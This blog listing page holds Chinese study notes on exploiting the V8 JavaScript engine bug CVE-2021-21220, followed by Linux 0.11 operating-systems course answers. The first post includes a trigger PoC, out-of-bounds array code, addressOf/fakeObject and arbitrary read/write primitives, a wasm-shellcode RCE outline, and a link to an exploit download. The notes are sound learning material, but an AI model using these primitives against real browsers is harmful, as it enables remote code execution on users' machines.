+这里有个坑,就是,debug版本会有很多调试信息,release没有,并且,release不能使用v8的gdb脚本(如job命令),如果想要release能使用gdb脚本的话,需要执行完tools/dev/v8gen.py x64.release后在生成的 out.gn/x64.release/args.gn中追加
+1234v8_enable_backtrace = truev8_enable_disassembler = truev8_enable_object_print = truev8_enable_verify_heap = true
+
+参考:https://www.cjovi.icu/CVE/1586.html
+四、配置v8自带的gdb脚本,方便调试v8自带了gdb调试脚本
+
+1.把v8&#x2F;tools&#x2F;gdbinit内容加到~&#x2F;.gdbint里面
+2.将v8&#x2F;tools&#x2F;gdb-v8-support.py放到一个目录(当前也行)
+在~&#x2F;.gdbint开头加入 source /自定义目录/gdb-v8-support.py
+参考:https://paper.seebug.org/1821/
+RCE的完整步骤incorrect numeric (理解漏洞本身)POC
+12345678910111213141516171819const _arr = new Uint32Array([2**31]);function foo(a) &#123;    var x = 1;    x = (_arr[0] ^ 0) + 1;    x = Math.abs(x);    x -= 2147483647;    x = Math.max(x, 0);    x -= 1;    if(x==-1) x = 0;    var arr = new Array(x);    arr.shift();    var cor = [1.1, 1.2, 1.3];    return [arr, cor];&#125;
+
+https://paper.seebug.org/1850/
+https://paper.seebug.org/1556/
+那么 这个长度-1的数组有什么用呢??????,见下面 Array.shift
+OOB (out-of-bounds memory access) 越界访问abusing array bounds check elimination.
+有历史沿革,之前是bounds-check elimination的问题,后来去掉了,但又有新的利用方式
+利用Array.shift实现oobhttps://bugs.chromium.org/p/chromium/issues/detail?id=1198696
+而负长度被视为一个正的大长度,因此该数组允许访问任意 OOB 数据。
+1234567891011121314151617181920function foo(a) &#123;        let x = -1;        if (a) x = 0xFFFFFFFF;        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));//构造长度为-1的数组        arr.shift();        let local_arr = Array(2);        console.log(&quot;现在长度&quot;+arr.length)        local_arr[0] = 5.1;//4014666666666666        let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8        arr[0] = 0x1122; //        return [arr, local_arr, buff];    &#125;    for (var i = 0; i &lt; 0x10000; ++i)        foo(false);    gc(); gc();     [corrput_arr, rwarr, corrupt_buff] = foo(true);		corrput_arr[12] = 0x22444;		delete corrput_arr;
+
+  通过上述漏洞,我们实现了一个长度为-1的数组arr(corrput_arr),-1扩展为无符号,就是0xffffffff,是一个很大的正数,从而可以实现越界读写,在此基础之上,进行后面的利用
+  1.获得了一个0xfffffff(-1长度)数组 arr(corrput_arr)
+  2.声明一个local_arr(rwarr),长度为2, 接着利用arr的oob,溢出修改它的长度为0x22444,也就是corrput_arr[12] &#x3D; 0x22444; (或者说 arr[12] &#x3D; 0x22444;) 这一位对应的是数组的长度
+  3.声明长度为0x1000的ArrayBuffer(corrupt_buff)
+  在2、3两步,我们能够得到一个数组和一个ArrayBuffer,但是我们还不能任意读写这个ArrayBuffer,一种实现方法是,通过corrput_arr的溢出,将rwarr的长度变长,覆盖到ArrayBuffer,于是我们就能够对他进行任意读写,从而实现对内存任意地址读写(其实是受限的,rwx)
+  为什么要强调ArrayBuffer呢?且看下面
+  疑问:从而实现对rwarr(local_arr)的跨界访问,为啥要这样呢?? 为啥不直接用arr
+越界访问rwarr数组(实现可控的JSArrayBuffer)  这张图比较形象,我们现在可以越界访问的是corrupt_arr,然后新建了一个rwarr数组,那么可以越界访问,把rwarr的长度修改的大一点,对应代码 corrput_arr[12] &#x3D; 0x22444;
+  那么为什么数组的第13位是代表着它的长度呢?这个具体原理方法在参考博客里,和它的数据结构有关.
+
+越界访问corrupt_buff(实现任意地址读写)http://www.hackdig.com/03/hack-70813.htm
+  背景知识:什么是backing_store? 对漏洞利用有什么用?
+  backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。
+  如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。
+任意地址写(通过伪造backing_store)1234function setbackingStore(hi, low) &#123;           rwarr[4] = i2f(fLow(rwarr[4]), hi);           rwarr[5] = i2f(low, fHi(rwarr[5]));       &#125;
+
+   从corrupt_buff中声明一个Dataview,而backing_store记录的就是实际DataView的内存地址。如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。
+  那么我们已经可以利用rwarr实现对corrupt_buff的任意读写,即可以任意修改backing_store.
+任意地址读(类型混淆)1234function leakObjLow(o) &#123;           corrupt_buff.slot = o;           return (fLow(rwarr[9]) - 1);       &#125;
+
+  leakObjLow函数使用corrupt_buff的slot属性，修改该属性为某一对象o，那么o的地址就会被写入到corrupt_buff所在的内存区间中，然后利用rwarr的溢出访问该值，实现泄露。
+  这里是不是用了类型混淆??
+利用oob造成类型混淆,那怎么利用呢?那出现类型混淆怎么利用呢？举个例子，如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。
+https://www.freebuf.com/vuls/203721.html
+addressOf 泄露某个对象的内存地址
+123456789// 泄露某个object的地址function addressOf(obj_to_leak)&#123;    obj_array[0] = obj_to_leak;    obj_array.oob(float_array_map);    let obj_addr = f2i(obj_array[0]) - 1n;    obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用    return obj_addr;&#125;
+
+fakeObject 将指定内存强制转换为一个js对象(有什么用呢?)
+123456789// 将某个addr强制转换为object对象function fakeObject(addr_to_fake)&#123;    float_array[0] = i2f(addr_to_fake + 1n);    float_array.oob(obj_array_map);    let faked_obj = float_array[0];    float_array.oob(float_array_map); // 还原array类型以便后续继续使用    return faked_obj;&#125;
+
+如何实现任意地址读写：构造AAR&#x2F;AAW原语https://paper.seebug.org/1821/#wasm
+fakeObject强制将一块内存伪造成一个数组对象??? 它的elements 指针是可控的,而这个指针指向了存储数组元素内容的内存地址。如果我们将这个指针修改为我们想要访问的内存地址，那后续我们访问这个数组对象的内容,实际上访问的就是我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内存访问读写效果了。
+哦哦哦因为可以任意访问,把这个当成一个数组对象了,那么对这个数组,我们是可以任意读取和修改的????
+wasm(webassembly) 实现执行shellcodehttps://paper.seebug.org/1821/#wasm
+https://www.freebuf.com/vuls/203721.html
+简单来说，wasm就是可以让JavaScript直接执行高级语言生成的机器码的一种技术。
+https://sensepost.com/blog/2018/introduction-to-webassembly/
+利用思路首先加载一段wasm代码到内存中然后通过addresssOf原语找到存放wasm的内存地址接着通过任意地址写原语用shellcode替换原本wasm的代码内容最后调用wasm的函数接口即可触发调用shellcode
+参考资料漏洞复现参考https://blog.csdn.net/m0_56642842&#x2F;article&#x2F;details&#x2F;118358830 这个就是教你怎么复现,不涉及原理
+https://www.cnblogs.com/7omss/p/15661338.html + 1
+exploit:https://share.weiyun.com/EXlNm02A 
+浏览器:https://share.weiyun.com/fZLcxFe9
+漏洞分析、调试及RCE步骤参考https://zhuanlan.zhihu.com/p/365297858
+https://blog.csdn.net/smellycat000/article/details/116078164
+https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce
+https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/
+https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js
+https://buaq.net/go-97833.html
+https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220分析/
+https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts&#x2F;2021-04-16-CVE-2021-21220.md
+https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce
+https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf
+https://www.sohu.com/a/383228797_354899
+https://bounty-team.github.io/vulnerability analysis/2021/04/16/CVE-2021-21220/
+https://www.freebuf.com/vuls/269629.html
+https://www.cjovi.icu/CVE/1586.html
+https://xz.aliyun.com/t/5190。v8 exploit入门[PlaidCTF roll a d8]
+https://gtoad.github.io/2019/07/25/V8-Debug/  V8引擎漏洞分析环境与调试方法基础
+https://paper.seebug.org/1850/   从 0 开始学 V8 漏洞利用之 CVE-2021-21220（八）
+https://www.freebuf.com/vuls/230182.html。v8利用入门：从越界访问到RCE
+https://www.freebuf.com/vuls/203721.html
+https://www.cjovi.icu/CVE/1586.html
+https://tiszka.com/blog/CVE_2021_21225.html
+https://kiprey.github.io/2021/01/v8-turboFan/
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8B/" title="ucas-操作系统-思考题下">ucas-操作系统-思考题下</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-14T03:01:59.000Z" title="发表于 2022-11-14 11:01:59">2022-11-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-18T03:21:19.288Z" title="更新于 2023-06-18 11:21:19">2023-06-18</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/">研究生课程</a></span></div><div class="content">21.进程0创建进程1时，为进程1建立了task_struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。p92
+第一页task_struct 就是进程1的
+第二页是和进程0一样的线性地址空间?
+22.假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。23.代码中的”ljmp %0\n\t” 很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m” (*&amp;__tmp.a)，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。p106\127
+include&#x2F;linux&#x2F;sched.h
+1234567891011121314151617181920/* *	switch_to(n) should switch tasks to task nr n, first * checking that n isn&#x27;t the current task, in which case it does nothing. * This also clears the TS-flag if the task we switched to has used * tha math co-processor latest. */#define switch_to(n) &#123;\struct &#123;long a,b;&#125; __tmp; \__asm__(&quot;cmpl %%ecx,_current\n\t&quot; \	&quot;je 1f\n\t&quot; \	&quot;movw %%dx,%1\n\t&quot; \	&quot;xchgl %%ecx,_current\n\t&quot; \ //强行切到进程0	&quot;ljmp %0\n\t&quot; \ //第一次执行完 for pause 这一行执行完了执行 _syscall0的 if(__res &gt;=0) || 看这里 copy_process: p-&gt;tss.eip = eip; 	&quot;cmpl %%ecx,_last_task_used_math\n\t&quot; \ //进程0回到for pause	&quot;jne 1f\n\t&quot; \	&quot;clts\n&quot; \	&quot;1:&quot; \	::&quot;m&quot; (*&amp;__tmp.a),&quot;m&quot; (*&amp;__tmp.b), \ //IA32 任务切换	&quot;d&quot; (_TSS(n)),&quot;c&quot; ((long) task[n])); \&#125;
+
+
+
+​		ljmp通过CPU的任务门机制并为实际使用任务门,它把CPU的各个寄存器值保存在当前进程的TSS中,将要转换的进程的TSS数据以及LDT的代码段、数据段描述符数据恢复给CPU的各个寄存器,从而实现进程的切换
+​		a代表EIP、b对应cs
+24.进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for(;;) pause()，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。p2 p107
+​	这个题的话,需要追踪一下fork的流程
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103init/main.c  if (!fork()) &#123;		/* we count on this going ok */		init(); //进程1	&#125;static inline _syscall0(int,fork)进入到include/unistd.h#define _syscall0(type,name) \\type name(void) \\&#123; \\long __res; \\__asm__ volatile (&quot;int $0x80&quot; \\ //int 0x80到哪呀, syscall 在sched_init那里,执行完,特权变0	: &quot;=a&quot; (__res) \\	: &quot;0&quot; (__NR_##name)); \\ //把name 贴过来if (__res &gt;= 0) \\	return (type) __res; \\errno = -__res; \\return -1; \\&#125;然后通过int $0x80int $0x80 p71 系统调用总入口int $0x80kernel/system_call.s.align 2_system_call:	cmpl $nr_system_calls-1,%eax ;核实独立访问?	ja bad_sys_call	push %ds           ;对齐??	push %es	push %fs	pushl %edx	pushl %ecx		# push %ebx,%ecx,%edx as parameters	pushl %ebx		# to the system call	movl $0x10,%edx		# set up ds,es to kernel space	mov %dx,%ds	mov %dx,%es	movl $0x17,%edx		# fs points to local data space	mov %dx,%fs	call _sys_call_table(,%eax,4) ; 从这里过去的	pushl %eax	movl _current,%eax	cmpl $0,state(%eax)		# state	jne reschedule	cmpl $0,counter(%eax)		# counter	je rescheduleret_from_sys_call:	movl _current,%eax		# task[0] cannot have signals	cmpl _task,%eax	je 3f	cmpw $0x0f,CS(%esp)		# was old code segment supervisor ?	jne 3f	cmpw $0x17,OLDSS(%esp)		# was stack segment = 0x17 ?	jne 3f	movl signal(%eax),%ebx	movl blocked(%eax),%ecx	notl %ecx	andl %ebx,%ecx	bsfl %ecx,%ecx	je 3f	btrl %ecx,%ebx	movl %ebx,signal(%eax)	incl %ecx	pushl %ecx	call _do_signal	popl %eax3:	popl %eax	popl %ebx	popl %ecx	popl %edx	pop %fs	pop %es	pop %ds	iret        _sys_call_table是在这里:include/linux/sys.hextern int sys_fork(); //对应 kernel/system_call.s中的_sys_forkfn_ptr sys_call_table[] = &#123; sys_setup, sys_exit, sys_fork, sys_read,sys_write, sys_open, sys_close, sys_waitpid, sys_creat, sys_link,....&#125;call的函数对应着这个:kernel/system_call.s.align 2 ;对齐的意思 _sys_fork:	call _find_empty_process ; kernel/fork.c 寻找空的进程任务号 task[i]	testl %eax,%eax  ;1	js 1f ; f d 前后的意思	push %gs	pushl %esi	pushl %edi	pushl %ebp	pushl %eax	call _copy_process ;操作系统核心函数!!!复制进程!!!!!!	addl $20,%esp1:	ret
+
+
+
+​		注意,当_sys_fork执行完之后,会回到 _system_call 继续往下执行,执行到下面一条语句的时候跳转
+​		je 3f           ; 如果当前进程是进程0,跳转到下面的3处执行,现在是进程0,所以跳转
+​		3处最后的iret会把ss、esp、eflags、cs、eip弹出,eip存储的是_syscall0中int $0x80的下一行,也就是if (__res &gt;&#x3D; 0)
+1234567891011121314151617181920212223242526272829303132333435363738.align 2_system_call:...........	call _sys_call_table(,%eax,4) ; 从这里过去的	pushl %eax         ; 回到这里!!	movl _current,%eax	cmpl $0,state(%eax)		# state	jne reschedule	cmpl $0,counter(%eax)		# counter	je rescheduleret_from_sys_call:	movl _current,%eax		# task[0] cannot have signals	cmpl _task,%eax	je 3f           ; 如果当前进程是进程0,跳转到下面的3处执行,现在是进程0,所以跳转	cmpw $0x0f,CS(%esp)		# was old code segment supervisor ?	jne 3f	cmpw $0x17,OLDSS(%esp)		# was stack segment = 0x17 ?	jne 3f	movl signal(%eax),%ebx	movl blocked(%eax),%ecx	notl %ecx	andl %ebx,%ecx	bsfl %ecx,%ecx	je 3f	btrl %ecx,%ebx	movl %ebx,signal(%eax)	incl %ecx	pushl %ecx	call _do_signal	popl %eax3:	popl %eax	popl %ebx	popl %ecx	popl %edx	pop %fs	pop %es	pop %ds	iret
+
+
+
+​		这个时候,res就是eax,eax是哪里得到的呢? 是在_system_call的时候(也就是int $0x80的时候),call完了sys_fork的时候,sys_fork返回时,执行的pushl %eax, sys_fork的返回值是last_pid,也就是创建的的pid,此时就是1
+123456kernel/system_call.s.align 2_system_call:	....	call _sys_call_table(,%eax,4) ; 从这里过去的	pushl %eax
+
+
+
+12345678910111213#define _syscall0(type,name) \\type name(void) \\&#123; \\long __res; \\__asm__ volatile (&quot;int $0x80&quot; \\ //int 0x80到哪呀, syscall 在sched_init那里,执行完,特权变0	: &quot;=a&quot; (__res) \\	: &quot;0&quot; (__NR_##name)); \\ //把name 贴过来if (__res &gt;= 0) \\	return (type) __res; \\errno = -__res; \\return -1; \\&#125;
+
+​		调用完了fork回到main,fork的返回值是1,所以!fork()是0,不进入到里面执行,进入到下面的pause
+12345if (! fork()) &#123;		/* we count on this going ok */		init(); //进程1	&#125;for(;;) pause(); //这一行是进程0的代码
+
+
+
+
+
+
+
+12345678kernel/sched.hint sys_pause(void)&#123;	current-&gt;state = TASK_INTERRUPTIBLE;	schedule();	return 0;&#125;
+
+​		进入schedule调度函数
+25、打开保护模式、分页后，线性地址到物理地址是如何转换的？26、getblk函数中，申请空闲缓冲块的标准就是b_count为0，而申请到之后，为什么在wait_on_buffer(bh)后又执行if（bh-&gt;b_count）来判断b_count是否为0？p114
+​		这个要看wait_on_buffer函数的功能了,它里面有sleep_on函数,而sleep_on函数里面包含了schedule函数,虽然现在的缓冲块是合适的,但是有可能在睡眠阶段的时候被别的任务占用,所以在使用之前需要判断是否被修改了,修改的话就需要等待解锁
+1234567891011121314151617181920212223242526272829fs/buffer.c  static inline void wait_on_buffer(struct buffer_head * bh)&#123;	cli();	while (bh-&gt;b_lock)		sleep_on(&amp;bh-&gt;b_wait); //bh在哪? bh全局的,buf init那里	//不要傻等,切进程, 有主动轮询变为被动响应	sti();&#125;kernel/sched.hvoid sleep_on(struct task_struct **p)&#123;	struct task_struct *tmp;// 有的是请求项 有的是缓冲块等待队列	if (!p)		return;	if (current == &amp;(init_task.task))		panic(&quot;task[0] trying to sleep&quot;);	tmp = *p; // bh-&gt;b_wait	*p = current;	current-&gt;state = TASK_UNINTERRUPTIBLE;	schedule();	if (tmp)		tmp-&gt;state=0;&#125;
+
+
+
+27、b_dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。p331
+​		要回答这个问题先得了解下b_uptodate,b_uptodate设置为1的时候(P326),标志着缓冲块中的数据是基于硬盘数据块的,内核可以放心地支持进程与缓冲块进行数据交互.
+​		此时,读操作不会改写缓冲块的数据,所以不会影响硬盘数据块的内容,如果写的话,就需要改变缓冲块的内容,此时,将b_dirt置为1,在同步前,当然可以继续读写了..我觉得这很显然.
+​		老师大概想表达的意思是,b_dirt虽然被置为1了,但是在此之前,硬盘-&gt;缓冲块这一路径已经同步过了,没有改写的部分是同步的,改写的那肯定就是改写的,所以不影响我们继续读写, b_uptodate仍然设置为1,它为1就标志着我们仍然可以读写
+代码证据​		想要的证据是说读写都不需要检查b_dirt位嘛?或者说改变了b_dirt不会改变b_uptodate?
+P331的file_write 
+P314的 file_read 
+P330的 bread getblk 
+1
+
+
+
+28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？赵炯p175
+​		
+kernel&#x2F;panic.c
+123456789101112131415161718192021222324/* *  linux/kernel/panic.c * *  (C) 1991  Linus Torvalds *//* * This function is used through-out the kernel (includeinh mm and fs) * to indicate a major problem. */#include &lt;linux/kernel.h&gt;#include &lt;linux/sched.h&gt;void sys_sync(void);	/* it&#x27;s really int */volatile void panic(const char * s)&#123;	printk(&quot;Kernel panic: %s\n\r&quot;,s);	if (current == task[0])		printk(&quot;In swapper task - not syncing\n\r&quot;);	else		sys_sync();	for(;;);&#125;
+
+sys_sync 在 fs&#x2F;buffer.c
+1234567891011121314int sys_sync(void)&#123;	int i;	struct buffer_head * bh;	sync_inodes();		/* write out inodes into buffers */	bh = start_buffer;	for (i=0 ; i&lt;NR_BUFFERS ; i++,bh++) &#123;		wait_on_buffer(bh);		if (bh-&gt;b_dirt)			ll_rw_block(WRITE,bh);	&#125;	return 0;&#125;
+
+29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）p103 p125
+30、wait_on_buffer函数中为什么不用if（）而是用while（）？​		因为它可能会执行很多次呀,要进行轮询,if只能判断一次,那为啥可能会执行很多次呢? 因为操作系统是很复杂,存在很多种可能,其中一种就是:
+​		很多歌进程都在等待同一个缓冲块,在缓冲块同步完毕的时候,唤醒各个等待进程到轮转到某一个进程的过程中,很有可能此时的缓冲块又被其他进程占用了,并且被加上了锁. 如果用if的话,只判断一次,就会出现错误,while的话则会重新判断.
+12345678910fs/buffer.c  static inline void wait_on_buffer(struct buffer_head * bh)&#123;	cli();	while (bh-&gt;b_lock)		sleep_on(&amp;bh-&gt;b_wait); //bh在哪? bh全局的,buf init那里	//不要傻等,切进程, 有主动轮询变为被动响应	sti();&#125;
+
+
+
+31、操作系统如何利用b_uptodate保证缓冲块数据的正确性？new_block (int dev)函数新申请一个缓冲块后，并没有读盘，b_uptodate却被置1，是否会引起数据混乱？详细分析理由。p325、328、329
+​		b_uptodate针对进程方向,它的作用是告诉内核,只要缓冲块的b_uptodate位1,则缓冲块的数据就是数据块中最新的了,可以放心地支持进程共享缓冲块的数据.反之如果为0,就提醒内核缓冲块并没有用绑定的数据块中的数据更新,不支持进程共享该缓冲块
+​		new_block是在设备商申请一个新的数据块,那么数据块里面此时是脏数据,不用管(是要管的,需要清零),那为啥把b_uptodate设置为1呢,因为缓冲块里也是脏数据,缓冲块和数据块都是脏数据,根本就不需要同步,同步也是浪费时间和精力
+​		下面进行详细的分析,新建的数据块只能用于两种用途,一种是存储文件的内容,一种是存储文件的i_zone的间接块管理信息.
+​		如果是存储文件的内容的话,就是上面所说,都是垃圾数据,不需要同步,不需要清零的其实,问题已经解决(或者说本身没有问题)
+​		如果是存储i_zone的间接块管理信息,则必须将缓冲块清零,表示没有索引间接数据块,否则垃圾数据会导致索引错误,破坏文件操作的正确性,这个时候虽然缓冲块和硬盘数据块的数据不一致,但和第一种情况一样,b_uptodate设置为1即可	
+12345678910111213fs/Bitmap.c int new_block(int dev)&#123;.........	if (bh-&gt;b_count != 1)		panic(&quot;new block: count is != 1&quot;);	clear_block(bh-&gt;b_data);	bh-&gt;b_uptodate = 1;	bh-&gt;b_dirt = 1;	brelse(bh);	return j;&#125;
+
+
+
+32、add_request（）函数中有下列代码   其中的xxx是什么意思？p121
+赵炯的书p202
+​		测试块设备的当前请求项指针是不是为空(也就是没有请求项,设备空闲)，如果是的话,就会设置该新建的请求项为当前请求项,作为请求项链表的表头
+kernel&#x2F;blk_dev&#x2F;ll_rw_block.c
+1234567891011121314151617181920/* * add-request adds a request to the linked list. * It disables interrupts so that it can muck with the * request-lists in peace. */static void add_request(struct blk_dev_struct * dev, struct request * req)&#123;.....	if (!(tmp = dev-&gt;current_request)) &#123;		dev-&gt;current_request = req;		sti();		(dev-&gt;request_fn)(); // 		return;	&#125;.....&#125;问的是,以下代码if (!(tmp = dev-&gt;current_request)) &#123;		dev-&gt;current_request = req;
+
+33、do_hd_request()函数中dev的含义始终一样吗？p122
+赵炯p195
+kernel&#x2F;blk_dev&#x2F;hd.c
+34、read_intr（）函数中，下列代码是什么意思？为什么这样做?p131
+​		read_intr()函数会将已经读到硬盘缓存中的数据复制到刚才被锁定的那个缓冲块中(注意,锁定的意思是阻止进程方面的操作,而不是阻止外设方面的操作)
+​		但是一次不一定就读完呀,所以就会有下面的代码,来判断请求项对应的缓冲块的数据是否读完了,如果没有读完的话,内核将再次把read_intr()绑定在硬盘中断服务程序上,以待下次使用,之后中断服务程序返回
+​		其实还没太理解这个–,是减的什么东西
+kernel&#x2F;blk_dev&#x2F;hd.c
+12345678910111213141516171819202122232425static void read_intr(void)&#123;	if (win_result()) &#123;		bad_rw_intr();		do_hd_request();		return;	&#125;	port_read(HD_DATA,CURRENT-&gt;buffer,256);	CURRENT-&gt;errors = 0;	CURRENT-&gt;buffer += 512;	CURRENT-&gt;sector++;	if (--CURRENT-&gt;nr_sectors) &#123;		do_hd = &amp;read_intr; //再来一次		return;	&#125;	end_request(1); //	do_hd_request();&#125;问的是这一段代码是什么意思 if (--CURRENT-&gt;nr_sectors) &#123;		do_hd = &amp;read_intr; //再来一次		return;	&#125;
+
+​		请求项的结构体在哪?
+kernel&#x2F;lkd_drv&#x2F;blk.h
+1234567891011121314151617/* * Ok, this is an expanded form so that we can use the same * request for paging requests when that is implemented. In * paging, &#x27;bh&#x27; is NULL, and &#x27;waiting&#x27; is used to wait for * read/write completion. */struct request &#123;	int dev;		/* -1 if no request */	int cmd;		/* READ or WRITE */	int errors;	unsigned long sector;	unsigned long nr_sectors;	char * buffer;	struct task_struct * waiting;	struct buffer_head * bh;	struct request * next;&#125;;
+
+35、bread（）函数代码中为什么要做第二次if (bh-&gt;b_uptodate)判断?p112、134.   赵炯 p342
+第一次是在找有没有被使用过的
+fs&#x2F;buffer.c
+12345678910111213141516171819/* * bread() reads a specified block and returns the buffer that contains * it. It returns NULL if the block was unreadable. */struct buffer_head * bread(int dev,int block)&#123;	struct buffer_head * bh;// 	if (!(bh=getblk(dev,block))) //找不到就应该继续等,所以不应该为空		panic(&quot;bread: getblk returned NULL\n&quot;);	if (bh-&gt;b_uptodate)		return bh;	ll_rw_block(READ,bh); //开始读写硬盘了,硬盘驱动	wait_on_buffer(bh);	if (bh-&gt;b_uptodate)		return bh;	brelse(bh);	return NULL;&#125;
+
+
+
+36、getblk（）函数中，两次调用wait_on_buffer（）函数，两次的意思一样吗？p125 bread里面一次
+37、getblk（）函数中    do {        if (tmp-&gt;b_count)            continue;        if (!bh || BADNESS(tmp)&lt;BADNESS(bh)) {            bh &#x3D; tmp;            if (!BADNESS(tmp))                break;        }&#x2F;* and repeat until we find something good *&#x2F;    } while ((tmp &#x3D; tmp-&gt;b_next_free) !&#x3D; free_list);说明什么情况下执行continue、break。38、make_request（）函数        if (req &lt; request) {        if (rw_ahead) {            unlock_buffer(bh);            return;        }        sleep_on(&amp;wait_for_request);        goto repeat;其中的sleep_on(&amp;wait_for_request)是谁在等？等什么？参考资料《Linux内核设计的艺术 第二版》 新设计团队
+《Linux内核完全注释》 赵炯
+《IA32》 手册 第三卷
+https://www.likecs.com/show-204742912.html
+https://github.com/sunym1993/flash-linux0.11-talk
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/" title="ucas-操作系统-思考题上">ucas-操作系统-思考题上</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-13T10:20:59.000Z" title="发表于 2022-11-13 18:20:59">2022-11-13</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-18T03:21:17.456Z" title="更新于 2023-06-18 11:21:17">2023-06-18</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/">研究生课程</a></span></div><div class="content">思考题 上1.为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？p1
+因为在启动加电时,操作系统本身还没有加载进内存,内存中是空的(或者说乱七八糟的东西?),无法进行执行.(CPU的逻辑电路被设定为只能运行内存中的程序) 而bios中的代码是写死的,所以可以直接跳转到biso处进行执行.
+2.为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？加载了一个扇区之后,操作系统就有能力继续加载后续的扇区了,这样做的原因大概是为了减小bios的大小? 或者提高速度? 或者给操作系统设计者更大的自由空间?
+bootsect需要进行规划内存,(为啥bios不能规划呢? 因为取决于操作系统?不同的操作系统不一样),进行一些自定义的内容. 而且bios来的话,应该是比较慢的,全加载进去再执行的话,一个是慢,还有就是不灵活.所以linux采用的是边加载边执行的思路! 
+上面的回答大概应该都有一点
+3.为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？p8
+感觉这就是个约定问题,就好像12345这样一样
+挪到0x90000是因为操作系统设计者对内存的规划,原先加载到0x07c00是统一的,之后可以按照自己的分配来进行
+4.bootsect、setup、head程序之间是怎么衔接的？给出代码证据。
+
+bootsect和setup的衔接bootsect 把自己移位,然后先把setup加载到0x90200开始的四个扇区,又把从硬盘第 6 个扇区开始往后的 240 个扇区，加载到内存 0x10000 处
+然后通过下面这条指令跳转到setup
+jmpi	0,SETUPSEG; 0x9020 跳转到setup.s开始继续执行了!!! (此时还是实模式, 偏移地址+ 基地址, 0+ 0x9020*0x10 &#x3D; 0x90200
